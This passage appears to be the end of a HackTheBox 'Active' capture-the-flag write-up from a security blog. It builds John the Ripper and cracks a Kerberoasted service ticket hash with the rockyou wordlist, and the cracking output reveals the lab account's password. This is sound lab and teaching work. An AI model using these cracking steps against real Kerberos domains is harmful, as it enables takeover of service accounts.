+<p>Now that we have a TGS, we can retrieve the Service’s password. If you run Kali, you will need to follow these steps for JTR to recognize the format.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/magnumripper/JohnTheRipper.git &amp;&amp; cd JohnTheRipper/src
+./configure
+make &lt;foo&gt; # &lt;-- see the line of the configure ^
+cd ../run
+./john --test
+</code></pre></div></div>
+
+<p>And then, voilà :)</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./john /usr/share/wordlists/rockyou.txt tgs.txt # DON'T use --format=krb5tgs
+</code></pre></div></div>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>./john --wordlist=rockyou.txt ~/documents/CTFs/OSCP/HTB/10.10.10.100/CIFS.krb5tgs
+Using default input encoding: UTF-8
+Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+0g 0:00:00:06 59.23% (ETA: 18:42:03) 0g/s 1421Kp/s 1421Kc/s 1421KC/s donmegaa..donisayangalia
+Ticketmaster1968 (?)
+1g 0:00:00:07 DONE (2018-10-20 18:42) 0.1342g/s 1414Kp/s 1414Kc/s 1414KC/s Tiffani143..Thrall
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed
+
+./john --wordlist=~/rockyou.txt ~/documents/CTFs/OSCP/HTB/10.10.10.100/CIFS.krb5tgs
+$ ./git/tools/JohnTheRipper/run/john --show ./documents/CTFs/OSCP/HTB/10.10.10.100/CIFS.krb5tgs 
+?:Ticketmaster1968
+
+1 password hash cracked, 0 left
+</code></pre></div></div>
+
+<p><img src="/assets/images/active_root.png" style="height: 100%; width: auto" /></p>
+
+
+  <h2>Latest Posts</h2>
+
+  <ul class="post-list">
+    
+      - <a href="/offsec/2018/10/21/HTB-active.html"> Htb Active</a>
+      <br>
+    
+      - <a href="/offsec/2018/09/24/HTB-nibbles.html"> Htb Nibbles</a>
+      <br>
+    
+      - <a href="/offsec/2018/09/24/HTB-celestial.html"> Htb Celestial</a>
+      <br>
+    
+      - <a href="/offsec/2018/08/05/Nsec-2018.html"> Nsec 2018</a>
+      <br>
+    
+      - <a href="/offsec/2018/06/25/HTB-valentine.html"> Htb Valentine</a>
+      <br>
+    
+  </ul>
+
+</div>
+
+
+      <footer class="site-footer">
+        <!-- SVG icons from https://iconmonstr.com -->
+
+        <!-- Github icon -->
+        <span class="my-span-icon">
+          <a href="" aria-label="'s GitHub" title="'s GitHub">
+            <svg class="my-svg-icon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23.957-.266 1.983-.399 3.003-.404 1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576 4.765-1.589 8.199-6.086 8.199-11.386 0-6.627-5.373-12-12-12z"/></svg>
+          </a>
+        </span>
+
+        <!-- Twitter icon -->
+        <span class="my-span-icon">
+          <a href="https://twitter.com/srb01246810" aria-label="'s Twitter" title="'s Twitter">
+            <svg class="my-svg-icon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path d="M12 0c-6.627 0-12 5.373-12 12s5.373 12 12 12 12-5.373 12-12-5.373-12-12-12zm6.066 9.645c.183 4.04-2.83 8.544-8.164 8.544-1.622 0-3.131-.476-4.402-1.291 1.524.18 3.045-.244 4.252-1.189-1.256-.023-2.317-.854-2.684-1.995.451.086.895.061 1.298-.049-1.381-.278-2.335-1.522-2.304-2.853.388.215.83.344 1.301.359-1.279-.855-1.641-2.544-.889-3.835 1.416 1.738 3.533 2.881 5.92 3.001-.419-1.796.944-3.527 2.799-3.527.825 0 1.572.349 2.096.907.654-.128 1.27-.368 1.824-.697-.215.671-.67 1.233-1.263 1.589.581-.07 1.135-.224 1.649-.453-.384.578-.87 1.084-1.433 1.489z"/></svg>
+          </a>
+        </span>
+
+        <!-- RSS icon -->
+        
+        <!-- Contact icon -->
+        
+        
+
+      </footer>
+    </section>
+
+    
+  </body>
+</html>
